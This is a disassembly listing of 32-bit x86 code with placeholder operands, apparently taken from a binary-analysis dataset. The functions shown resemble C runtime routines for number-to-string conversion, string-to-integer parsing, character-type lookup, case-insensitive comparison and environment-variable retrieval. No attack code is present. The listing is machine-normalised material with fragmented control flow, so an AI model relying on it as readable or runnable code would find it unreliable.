cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_427f63
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_428523
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_428523
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_428071
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rwxdata ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427f9c
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_427f63
pop esi
pop ebp
retn
sub_428137
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_40d7cc
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_40d7cc
push 0x16
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_40d7cc
push 0x22
jmp r-xdata
pop edi
mov [ ebp - 0x4 ] ebx
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
mov edi ecx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov [ ecx ] dl
inc ecx
inc [ ebp - 0x4 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov [ ecx ] bl
dec ecx
mov [ esi ] bl
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_428214
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_428137
pop ebp
retn
sub_42823e
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov ecx [ ebp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_428137
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
inc eax
sub_42827f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_40d7cc
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ebx
mov [ edi ] bl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
pop ebx
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_40d7cc
push 0x22
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov esi edi
cmp [ ebp + 0x18 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ebx
neg edx
adc eax ebx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test edx edx
jbe r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push edx
call sub_413c80
mov [ ebp - 0x8 ] ebx
mov ebx edx
mov edx eax
mov eax ebx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_40d7cc
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
sub_428377
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
push edi
mov edi [ ebp + 0x10 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42827f
pop edi
pop ebp
retn
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] eax
jae r-xdata
sub_4283ac
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42827f
pop edi
pop ebp
retn
sub_4283cb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4283ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_42842c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_40c8c3
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_413987
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_41aba8
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4284e4
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_428523
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_40c8c3
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_40d7cc
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_413987
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_42842c
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41a9a9
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_428638
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_428523
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_428670
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4286d1
push [ rwxdata ]
call sub_40e714
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_410da6
push 0x1
push 0x0
call sub_426b8e
add esp 0xc
jmp sub_426a77
call eax
sub_4286fb
mov edi edi
push ebp
mov ebp esp
push esi
push [ rwxdata ]
call sub_40e714
push [ ebp + 0x8 ]
mov esi eax
call sub_40e699
pop ecx
pop ecx
mov [ rwxdata ] eax
mov eax esi
pop esi
pop ebp
retn
sub_428730
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_428764
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
push esi
mov esi [ rwxdata ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rwxdata ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_4136f0
pop ecx
mov edi eax
jmp r-xdata
call sub_428f95
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rwxdata ]
test esi esi
je r-xdata
push eax
call sub_4136f0
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_428f7b
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_4287eb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] ebx
cmp eax ebx
je r-xdata
call sub_40d7cc
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop esi
pop ebx
pop ebp
retn
cmp eax ebx
je r-xdata
jmp r-xdata
push edi
push [ ebp + 0x10 ]
call sub_428764
mov edi eax
pop ecx
cmp edi ebx
je r-xdata
mov [ eax ] bl
xor eax eax
push edi
call sub_4136f0
inc eax
pop ecx
mov [ esi ] eax
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp eax [ ebp + 0xc ]
jbe r-xdata
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
push 0x22
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
pop edi
sub_428880
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
cmp ebx edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx ] edi
cmp eax edi
je r-xdata
call sub_40d7cc
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
mov [ eax ] edi
pop edi
pop esi
leave
retn
push [ ebp + 0xc ]
call sub_428764
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
je r-xdata
xor eax eax
push eax
call sub_4136f0
mov esi eax
inc esi
push 0x1
push esi
call sub_42902c
add esp 0xc
mov [ ebx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
push esi
push eax
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
call sub_40d7cc
mov [ eax ] 0xc
call sub_40d7cc
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_40d5e2
add esp 0x14
mov [ eax ] esi
sub_428924
push 0x10
push r--data
call sub_40e30c
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi 0x7fff
push edi
push [ ebp + 0x8 ]
call sub_42906c
pop ecx
pop ecx
cmp eax edi
sbb eax eax
neg eax
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
xor eax eax
jmp r-xdata
push 0x7
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_428764
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42899e
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
sub_4289a7
push 0xc
push r--data
call sub_40e30c
push 0x7
call sub_4160e9
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
mov [ edi ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx ebx
je r-xdata
call sub_40d7cc
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
ja r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_428a76
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
xor eax eax
xor eax eax
inc eax
jmp r-xdata
cmp ecx ebx
jne r-xdata
cmp ecx ebx
je r-xdata
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_428764
pop ecx
mov esi eax
cmp esi ebx
je r-xdata
mov [ ecx ] bl
mov [ ebp - 0x1c ] ebx
push esi
call sub_4136f0
pop ecx
inc eax
mov [ edi ] eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax [ ebp + 0x10 ]
jbe r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4192c8
add esp 0xc
cmp eax ebx
je r-xdata
mov [ ebp - 0x1c ] 0x22
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
sub_428a7f
push 0x10
push r--data
call sub_40e30c
push 0x7
call sub_4160e9
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
mov [ ebx ] esi
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
call sub_40d7cc
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
mov [ ebp - 0x1c ] edi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
setne al
cmp eax esi
je r-xdata
mov [ eax ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_428b5c
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
push [ ebp + 0x10 ]
call sub_428764
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax esi
je r-xdata
mov [ ebp - 0x1c ] esi
push eax
call sub_4136f0
mov edi eax
inc edi
push 0x1
push edi
call sub_42902c
add esp 0xc
mov [ ebx ] eax
cmp eax esi
jne r-xdata
push [ ebp - 0x20 ]
push edi
push eax
call sub_4192c8
add esp 0xc
cmp eax esi
je r-xdata
call sub_40d7cc
mov [ eax ] 0xc
call sub_40d7cc
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
mov [ eax ] edi
sub_428b65
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
call sub_40c8c3
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
xor ebx ebx
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x14 ] ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x2c ] bl
je r-xdata
push esi
mov esi [ ebp - 0x38 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x30 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebp - 0x1 ]
mov ecx [ esi + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x38 ]
push eax
movzx eax [ ebp - 0x1 ]
push 0x8
push eax
call sub_42842c
mov esi [ ebp - 0x38 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop ebx
leave
retn
mov al [ edi ]
inc edi
cmp [ esi + 0xac ] 0x1
mov [ ebp - 0x1 ] al
jle r-xdata
cmp [ ebp - 0x1 ] 0x2d
mov [ ebp - 0x8 ] edi
jne r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x1 ] 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
push 0x10
pop ecx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov al [ edi ]
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1 ] al
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp - 0x1 ] 0x30
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
mov edi eax
push edi
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x24 ] edx
call sub_413c80
mov [ ebp - 0x1c ] ebx
mov ebx [ esi + 0xc8 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x1 ] 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test eax 0x103
je r-xdata
movsx esi cl
sub esi 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] ecx
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec [ ebp - 0x8 ]
test al 0x8
jne r-xdata
mov al cl
sub al 0x61
cmp al 0x19
movsx eax cl
ja r-xdata
cmp esi [ ebp + 0x14 ]
jae r-xdata
inc edi
mov al [ edi ]
inc edi
mov [ ebp - 0x1 ] al
mov [ ebp - 0x8 ] edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
lea esi [ eax - 0x37 ]
sub eax 0x20
mov ecx [ ebp - 0xc ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0x14 ]
jb r-xdata
call sub_40d7cc
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp - 0x10 ]
push [ ebp - 0x24 ]
push edi
call sub_428730
xor ecx ecx
add eax esi
adc edx ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
ja r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x10 ] 0xffffffff
or [ ebp - 0xc ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop esi
test eax eax
je r-xdata
and eax 0x2
je r-xdata
mov cl [ ebp - 0x1 ]
movzx eax cl
movzx eax [ ebx + eax * 2 ]
test al 0x4
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ ebp - 0x10 ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jb r-xdata
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0xc ] esi
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] ebx
ja r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x14 ]
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] esi
jb r-xdata
jb r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x1 ] al
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x1c ]
jb r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x30 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x10 ] 0x0
ja r-xdata
ja r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jbe r-xdata
cmp esi [ ebp - 0x20 ]
jbe r-xdata
sub_428dfc
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rwxdata ] eax
jne r-xdata
push eax
push rwxdata
jmp r-xdata
call sub_428b65
add esp 0x14
pop ebp
retn
sub_428e44
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rwxdata
jmp r-xdata
call sub_428b65
add esp 0x14
pop ebp
retn
sub_428e8d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_429417
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429459
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_428f95
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rwxdata ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_41348c
pop ecx
pop ecx
